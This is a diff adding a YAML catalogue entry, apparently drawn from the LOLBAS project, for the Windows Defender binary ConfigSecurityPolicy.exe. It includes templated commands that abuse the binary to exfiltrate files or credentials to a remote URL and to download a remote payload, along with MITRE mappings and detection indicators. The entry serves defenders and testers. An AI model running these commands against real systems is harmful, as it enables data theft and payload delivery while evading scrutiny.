@@ -1,0 +1,104 @@
+id: lolbas/T1NCaW5hcmllcy9Db25maWdTZWN1cml0eVBvbGljeS55bWw/VXBsb2Fk/0
+type: binary
+platform: windows
+name: ConfigSecurityPolicy.exe
+phases:
+- exfiltration
+capabilities:
+- file-upload
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1567
+opsec:
+  noise: high
+  triggers: ConfigSecurityPolicy storing data into alternate data streams.
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_configsecuritypolicy.yml
+commands:
+- template: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
+  comment: Upload file, credentials or data exfiltration in general
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: ConfigSecurityPolicy.exe
+      category: Upload
+      privileges: User
+      mitre_id: T1567
+      source_file: OSBinaries/ConfigSecurityPolicy.yml
+      command_source_index: 0
+      document_utf8: "---\nName: ConfigSecurityPolicy.exe\nDescription: Binary part of Windows Defender.\
+        \ Used to manage settings in Windows Defender. You can configure different pilot collections for\
+        \ each of the co-management workloads. Being able to use different pilot collections allows you\
+        \ to take a more granular approach when shifting workloads.\nAuthor: Ialle Teixeira\nCreated:\
+        \ 2020-09-04\nCommands:\n  - Command: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}\n \
+        \   Description: Upload file, credentials or data exfiltration in general\n    Usecase: Upload\
+        \ file\n    Category: Upload\n    Privileges: User\n    MitreID: T1567\n    OperatingSystem: Windows\
+        \ 10\n  - Command: ConfigSecurityPolicy.exe {REMOTEURL}\n    Description: It will download a remote\
+        \ payload and place it in INetCache.\n    Usecase: Downloads payload from remote server\n    Category:\
+        \ Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows\
+        \ 11\n    Tags:\n      - Download: INetCache\nFull_Path:\n  - Path: C:\\Program Files\\Windows\
+        \ Defender\\ConfigSecurityPolicy.exe\n  - Path: C:\\ProgramData\\Microsoft\\Windows Defender\\\
+        Platform\\4.18.2008.9-0\\ConfigSecurityPolicy.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_configsecuritypolicy.yml\n\
+        \  - IOC: ConfigSecurityPolicy storing data into alternate data streams.\n  - IOC: Preventing/Detecting\
+        \ ConfigSecurityPolicy with non-RFC1918 addresses by Network IPS/IDS.\n  - IOC: Monitor process\
+        \ creation for non-SYSTEM and non-LOCAL SERVICE accounts launching ConfigSecurityPolicy.exe.\n\
+        \  - IOC: User Agent is \"MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E;\
+        \ .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)\"\nResources:\n  - Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads\n\
+        \  - Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads\n  - Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor\n\
+        \  - Link: https://twitter.com/NtSetDefault/status/1302589153570365440?s=20\nAcknowledgement:\n\
+        \  - Person: Ialle Teixeira\n    Handle: '@NtSetDefault'\n  - Person: Nir Chako (Pentera)\n  \
+        \  Handle: '@C_h4ck_0'\n"
+      document_sha256: sha256:e2b0547e4233218d670a19e9ad050e9e5260fb698aeadb945af42abd68dcf068
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1567
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:ef1c2ba45a9e7c017ec54aa259c3e1022b422b6ff16d97d18e4053f4981b4caa
